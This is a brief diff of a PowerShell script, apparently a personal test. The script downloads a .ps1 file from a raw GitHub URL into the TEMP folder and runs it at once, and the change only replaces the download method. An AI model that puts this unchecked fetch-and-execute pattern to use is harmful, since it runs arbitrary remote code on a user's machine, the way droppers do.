@@ -27,5 +27,5 @@ Start-Sleep -Milliseconds 800
 # --- TELECHARGEMENT ET EXECUTION ---
 $url = "https://raw.githubusercontent.com/asmaerouel/MesTest/refs/heads/main/test1.ps1"
 $file = "$env:TEMP\github-script.ps1"
-(New-Object System.Net.WebClient).DownloadFile($url, $file)
+Invoke-WebRequest -Uri $url -OutFile $file
 & $file
